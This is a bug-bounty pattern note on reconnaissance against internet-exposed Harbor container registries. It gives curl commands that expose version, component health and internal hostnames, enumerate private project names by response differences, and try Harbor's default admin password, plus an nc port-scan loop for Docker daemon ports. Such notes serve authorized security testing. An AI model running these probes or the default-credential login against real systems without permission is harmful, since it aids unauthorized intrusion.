---
type: pattern
title: "Pattern - Harbor Registry Enumeration"
tags: [pattern, cwe-204, harbor, docker-registry, container, info-disclosure, bb-pattern]
status: verified
vuln_class: info-leak
severity_range: P2-P4
seen_in: [harbor-registry, docker-registry]
prerequisites: []
last_updated: 2026-06-15
---

# Pattern - Harbor Registry Enumeration

> **TL;DR**: An internet-exposed Harbor container registry leaks a surprising amount of information to unauthenticated requests — version, auth mode, component health, internal Token Service hostnames, and (via a response-differential in the Docker Registry v2 API) confirmation of which private project names exist. None of this requires valid credentials.

## Trigger / When to look

The target exposes a Harbor container image registry (or the underlying Docker Registry v2 API) reachable from the public internet, typically on the standard HTTPS port with a `/api/v2.0/` or `/v2/` path prefix. Look for it during general recon whenever a host fingerprints as Harbor (favicon, login page branding, `Server` header, or a `/api/v2.0/systeminfo` response).

## Detection

### 1. Version + auth mode

```bash
curl -sk "https://target.example.com/api/v2.0/systeminfo"
# -> harbor_version, auth_mode (db_auth / ldap_auth / oidc_auth), self_registration
```

### 2. Component health status

```bash
curl -sk "https://target.example.com/api/v2.0/health"
# -> status of core / database / jobservice / portal / redis / registry / registryctl
```

### 3. Token Service hostname leak

```bash
curl -sk -I "https://target.example.com/v2/"
# -> Www-Authenticate: Bearer realm="https://<internal-hostname>/service/token"
# The realm value frequently leaks an internal or dev-platform hostname
# that is not otherwise advertised publicly.
```

### 4. Private project name enumeration (CWE-204: response discrepancy)

The Docker Registry v2 API returns a different error for an **existing** private project versus a **non-existent** one:

```bash
# Existing project
curl -sk "https://target.example.com/v2/<project>/app/tags/list" \
  -H "Authorization: Bearer <anon_token>"
# -> "unauthorized to access repository: <project>/app, action: pull"

# Non-existent project
curl -sk "https://target.example.com/v2/<nonexistent>/app/tags/list" \
  -H "Authorization: Bearer <anon_token>"
# -> "project <nonexistent> not found"
```

**Note**: repository names *inside* a confirmed project cannot be enumerated the same way — any repo name under a real project still returns `unauthorized`. Only project-level existence is disclosed.

### 5. Anonymous JWT token issuance

```bash
curl -sk "https://target.example.com/service/token?service=harbor-registry&scope=repository:<project>/<repo>:pull"
# -> valid JWT is issued, but `access[].actions` is empty ([]) — no actual permission
```

### Common project-name wordlist

`test`, `dev`, `staging`, `production`, `release`, `build`, `deploy`, `library`, `internal`, `public`, `private`, `default`, `admin`, `base`, `infra`, `tools`, `app`, `web`, `api`, `backend`, `frontend`

## Verification (safe)

| Test | Command | Purpose |
|------|---------|---------|
| Default credentials | `curl -sk -u 'admin:Harbor12345' ".../api/v2.0/users"` | Harbor's well-known default admin password |
| Self-registration | check the `self_registration` field from `/api/v2.0/systeminfo` | can an attacker just create an account? |
| OIDC redirect | `POST /c/oidc/login` | CVE-2022-46171-style OIDC redirect handling issue |

## Adjacent check: Docker daemon exposure

While enumerating the registry, also check for an unauthenticated Docker Engine API on adjacent ports — a much higher-severity finding if present:

```bash
for port in 2375 2376 5000 4443 8080; do
  timeout 3 nc -z target.example.com "$port" && echo "OPEN: $port"
done
```

## Impact Assessment

- **Verified**: unauthenticated disclosure of Harbor version, auth mode, component topology, internal hostname (via Token Service realm), and existence of specific private project names. This alone is typically **P4-P5 informational**.
- **Escalated**: if `self_registration` is enabled, or the default admin credential still works, or an internal hostname disclosed here turns out to be reachable and unauthenticated elsewhere — this becomes a foothold for a much higher-severity chain (registry takeover, image poisoning, credential harvesting from image configs). Treat the hostname/project leak as reconnaissance fuel, not a standalone high-severity bug, unless you can chain it.

## Stop-Loss

- Repository names inside a project cannot be brute-forced past the "project exists" boundary — don't burn time trying.
- If `auth_mode` is `oidc_auth` and self-registration is disabled, don't expect the default-credential check to work; move on to the OIDC redirect check instead.
- If none of the above yield anything beyond "project X exists," downgrade to P4/P5 and note it as supporting evidence for a chain rather than filing standalone.

## Bypass Techniques

N/A — this pattern is itself pre-auth information disclosure; there is no WAF/auth layer to bypass at this stage.

## Case Study

In one engagement, a Harbor v2.11.0 instance's Token Service response leaked an internal registry/dev-platform hostname via the `Www-Authenticate` realm, and the project-existence differential confirmed that a project named `test` existed on the registry — useful corroborating evidence for a broader informational-disclosure report, though not independently high severity.

## References

- [[Pattern - Hardcoded Credentials]]
- [[Pattern - Docker Hub Config Env Exfil]]
- Docker Registry HTTP API V2 specification: <https://distribution.github.io/distribution/spec/api/>
- Harbor documentation: <https://goharbor.io/docs/>
